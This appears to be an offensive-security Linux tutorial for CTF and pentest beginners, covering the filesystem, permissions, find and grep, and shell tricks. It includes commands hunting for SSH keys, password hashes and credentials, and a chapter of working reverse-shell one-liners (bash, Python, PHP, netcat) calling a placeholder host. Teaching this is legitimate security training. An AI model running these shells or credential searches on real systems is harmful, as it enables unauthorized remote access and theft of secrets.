Chapter 01 // The File System

🗂️ The Linux File System — Know Where Everything Lives

Linux doesn't have C:\ or D:\ drives. Everything is under one root: /. As a hacker, knowing what lives where is essential.

/ ← Root of everything ├── /bin ← Essential binaries (ls, cat, cp, mv, etc.) ├── /sbin ← System binaries (ifconfig, iptables, etc.) ├── /usr/bin ← Installed user programs ├── /usr/local/bin ← Locally compiled programs │ ├── /etc ← 🔑 Config files (HACKER GOLDMINE) │ ├── /etc/passwd ← User list (username:x:uid:gid:info:home:shell) │ ├── /etc/shadow ← Password hashes (root-readable only) │ ├── /etc/hosts ← Local DNS overrides │ ├── /etc/crontab ← System cron jobs │ └── /etc/sudoers ← Who can sudo what │ ├── /home ← User home directories (/home/alice, /home/bob) ├── /root ← Root user's home (the flag is usually here!) │ ├── /var ← Variable data │ ├── /var/log ← Log files (auth.log, syslog, apache2/*) │ ├── /var/www/html ← Web server files (PHP, HTML) │ └── /var/backups ← Backup files (often readable, contain creds) │ ├── /tmp ← Temporary files (world-writable! use for exploits) ├── /dev ← Device files (/dev/null, /dev/tty) ├── /proc ← Running processes as files (/proc/1/cmdline) └── /opt ← Optional software (custom apps, vuln binaries)

Navigation commands

# Where am I? pwd # List files ls # basic list ls -l # long format (permissions, size, date) ls -la # including hidden files (start with .) ls -lh # human-readable sizes ls -lt # sorted by modification time # Navigate cd /etc # go to /etc cd .. # go up one level cd ~ # go home cd - # go to previous directory
# Read files cat file.txt # print entire file less file.txt # scroll through (q to quit) head -20 file # first 20 lines tail -20 file # last 20 lines tail -f file # follow (live log view) # Search inside files grep "password" file.txt grep -r "secret" /var/www/ # recursive grep -i "admin" users.txt # case-insensitive grep -v "comment" file # EXCLUDE lines

Chapter 02 // Permissions

🔒 File Permissions — Critical for PrivEsc

Linux permissions control who can read, write, and execute every file. As a hacker, you need to find files with wrong permissions — writable by you when they shouldn't be.

🔍 Permission Decoder — Paste a permission string

$ ls -la →
777 (world-writable!) 644 (normal file) SUID binary writable by all
## Reading ls -la output: -rwxr-xr-- 1 root www-data 4096 Jan 1 backup.sh ## ↑ breakdown: ## - = file type (- = file, d = dir, l = symlink) ## rwx = owner (root) can Read, Write, Execute ## r-x = group (www-data) can Read, Execute (no Write) ## r-- = others can only Read ## Special permission bits (SUID/SGID): -rwsr-xr-x # 's' in owner execute = SUID → runs as file owner -rwxr-sr-x # 's' in group execute = SGID → runs as group owner ## As a hacker — look for: find / -writable -type f 2>/dev/null # files YOU can write find / -writable -type d 2>/dev/null # directories YOU can write find / -perm -o+w -type f 2>/dev/null # world-writable files ## Modify permissions (if you're the owner): chmod +x script.sh # make executable chmod 777 file # world read/write/execute (dangerous!) chmod 600 id_rsa # SSH key: only owner can read

Chapter 04 // File Operations

📁 Essential File Operations

## ─── FINDING FILES (critical for hacking) ──────────────── find / -name "*.conf" 2>/dev/null # find all .conf files find / -name "id_rsa" 2>/dev/null # find SSH keys find / -name "*.php" 2>/dev/null # find PHP files find / -size +10M -type f 2>/dev/null # find large files find / -newer /tmp/ref 2>/dev/null # files newer than ref find / -user root -perm -4000 2>/dev/null # SUID owned by root find /home -name ".bash_history" 2>/dev/null # everyone's history ## ─── GREP (search inside files) ────────────────────────── grep -r "password" /var/www/ 2>/dev/null # find creds in web files grep -rn "DB_PASS\|DB_PASSWORD" /var/www/ # database passwords grep -rl "secret" /etc/ 2>/dev/null # files containing 'secret' grep -E "^root" /etc/passwd # root user entry ## ─── AWK & SED (process text output) ───────────────────── cat /etc/passwd | awk -F: '{print $1}' # extract just usernames cat /etc/passwd | awk -F: '$3==0' # find UID 0 (root) accounts sed -i 's/old/new/g' file.txt # replace text in file ## ─── MOVING & COPYING ───────────────────────────────────── cp /etc/shadow /tmp/shadow.bak # copy file mv file.txt /tmp/ # move file cp -r /etc/ /tmp/etc_backup/ # copy directory recursively ## ─── ARCHIVES (transfer tools, exfil) ─────────────────── tar czf archive.tar.gz /var/www/html/ # compress directory tar xzf archive.tar.gz # extract zip -r archive.zip /var/www/html/ # zip it unzip archive.zip # unzip

Chapter 06 // Shell-Fu

⚡ Shell Tricks That Make You 10x Faster

## ─── PIPES & REDIRECTION ────────────────────────────────── cat /etc/passwd | grep bash # pipe: send output to next command ls -la > output.txt # redirect output TO file ls -la >> output.txt # append output to file ls -la 2>/dev/null # redirect ERRORS to null (silence errors) ls -la 2>&1 # merge stderr into stdout command < input.txt # use file as input ## ─── COMMAND CHAINING ───────────────────────────────────── cmd1 && cmd2 # run cmd2 ONLY if cmd1 succeeds cmd1 || cmd2 # run cmd2 ONLY if cmd1 FAILS cmd1 ; cmd2 # run cmd2 always, regardless ## ─── USEFUL SHORTCUTS ──────────────────────────────────── Ctrl+C # kill current command Ctrl+Z # suspend to background (resume: fg) Ctrl+L # clear screen (same as: clear) Ctrl+R # search command history Tab # autocomplete paths and commands !! # run the last command sudo !! # run last command with sudo !$ # last argument of previous command ## ─── VARIABLES & SCRIPTING ─────────────────────────────── TARGET="10.10.10.5" echo $TARGET nmap -sV $TARGET ## ─── LOOPS (for recon automation) ─────────────────────── for ip in $(cat hosts.txt); do ping -c 1 $ip >/dev/null 2>&1 && echo "$ip is ALIVE" done ## ─── ENCODE / DECODE ───────────────────────────────────── echo "hello" | base64 # encode echo "aGVsbG8=" | base64 -d # decode echo -n "text" | md5sum # MD5 hash echo -n "text" | sha256sum # SHA256 hash

Chapter 07 // Reverse Shells

🔙 Reverse Shells — Getting Interactive Access

A reverse shell is when the victim machine connects BACK to your machine. This bypasses firewalls (outbound traffic is usually allowed). Essential concept for CTFs and pentests.

💡 Practice only: These are for CTF machines, TryHackMe/HackTheBox rooms, and authorized pentests. Set up a listener and practice on your local Kali VM.
## ─── STEP 1: Start a listener on your machine ──────────── nc -lvnp 4444 ## Or for a better shell: rlwrap nc -lvnp 4444 # adds arrow keys + history ## ─── STEP 2: Get the victim to run one of these ────────── # Bash reverse shell (most common): bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 # Python3 reverse shell: python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("YOUR_IP",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' # PHP reverse shell (web exploit context): php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");' # Netcat reverse shell: nc YOUR_IP 4444 -e /bin/bash # If nc doesn't have -e: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc YOUR_IP 4444 >/tmp/f ## ─── STEP 3: Upgrade the shell (make it interactive) ───── # After you get the basic shell, run these: python3 -c 'import pty; pty.spawn("/bin/bash")' # Then press: Ctrl+Z stty raw -echo fg # Press Enter twice export TERM=xterm # Now you have arrow keys, tab completion, Ctrl+C won't kill your shell ## ─── SHORTCUT: Use revshells.com to generate payloads ──── ## https://revshells.com — just enter IP + port, pick language
